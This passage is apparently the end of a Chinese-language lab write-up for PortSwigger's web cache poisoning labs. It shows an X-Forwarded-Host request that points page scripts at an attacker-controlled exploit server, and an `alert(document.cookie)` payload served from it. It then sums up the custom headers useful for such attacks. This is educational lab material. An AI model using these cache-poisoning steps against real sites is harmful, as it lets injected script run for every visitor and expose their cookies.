const setLangCookie = (lang) => {
  document.cookie = "lang=" + lang;
};
loadCountry({ country: "United Kingdom" });
```

2. 載了一個之前沒出現過的檔案

/resources/js/analytics.js

```js
function randomString(length, chars) {
  var result = "";
  for (var i = length; i > 0; --i)
    result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}
var id = randomString(
  16,
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
);
fetch("/analytics?id=" + id);
```

3. 承上，戳了 API 沒有 Response Body

/analytics?id=Op6rZL08pwqzj8U2

```
Content-Encoding: gzip
Content-Length: 0
X-Frame-Options: SAMEORIGIN
```

嘗試 `X-Forwarded-Host`

```
GET /post?postId=10 HTTP/2
Host: 0ae400830490275985435d7500ab0015.web-security-academy.net
X-Forwarded-Host: exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net
```

發現有三個地方都有被汙染

```html
<!DOCTYPE html>
<html>
    <head>
        <link rel="canonical" href='//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/post?postId=10'/>
    </head>
    <body>
        <script type="text/javascript" src="//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/resources/js/analytics.js"></script>
        <script src=//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/js/geolocate.js?callback=loadCountry></script>
```

但實際把 `X-Forwarded-Host` 拔掉後，又只剩下

```html
<script src=//exploit-0a860087049327d985e25c0f01ec004b.exploit-server.net/js/geolocate.js?callback=loadCountry></script>
```

所以趕快在 exploit-server 設定

```
/js/geolocate.js
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
alert(document.cookie)
```

成功解題，怎感覺有點簡單(?)我感覺背後的機制比較難，但 exploit 的過程蠻順利的

## 小結

這個系列的 Labs 我覺得整體偏難，我本來以為我已經有 [HTTP Cache](../http/http-caching-1.md) 的經驗，學習起來會比較輕鬆，但攻擊的思維還是不夠，雖然 HTTP 基本觀念有，但 Web Cache Poisoning 在實務上沒 exploit 過，所以學起來真的稍為辛苦，但也學到很多東西～其實主要就是 `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-HTTP-Method-Override` 跟 `X-Original-URL` 這些 Custom HTTP Request Headers 可以用來 exploit Web Cache Poisoning 啦！

## 參考資料

- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/all-labs#web-cache-poisoning
